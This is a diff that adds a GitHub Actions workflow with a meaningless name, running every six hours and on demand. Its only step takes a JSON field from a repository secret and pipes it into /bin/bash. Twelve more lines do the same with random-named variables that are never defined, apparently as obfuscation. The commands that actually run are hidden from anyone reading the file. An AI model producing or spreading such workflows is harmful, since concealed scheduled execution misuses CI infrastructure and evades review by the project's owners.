@@ -1,0 +1,29 @@
+name: zanjiexiangwang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zanjiexiangwang
+        env:
+          fqpt4793: ${{ secrets.fqpt4793 }}
+        run: |
+          echo $fqpt4793 | jq -r .tny2044 | /bin/bash
+          echo $ab8 | jq -r .dza58 | /bin/bash
+          echo $zrqpp6 | jq -r .oxpu665 | /bin/bash
+          echo $fu8011 | jq -r .gfntt331 | /bin/bash
+          echo $ffzbl48 | jq -r .y271 | /bin/bash
+          echo $ie2 | jq -r .ic720 | /bin/bash
+          echo $wa2721 | jq -r .rumg5 | /bin/bash
+          echo $qktj2079 | jq -r .js4 | /bin/bash
+          echo $adi96 | jq -r .uar789 | /bin/bash
+          echo $vs4789 | jq -r .nl84 | /bin/bash
+          echo $adoj63647 | jq -r .kid85 | /bin/bash
+          echo $hle86119 | jq -r .z733 | /bin/bash
+          echo $o9 | jq -r .qipv04 | /bin/bash
+
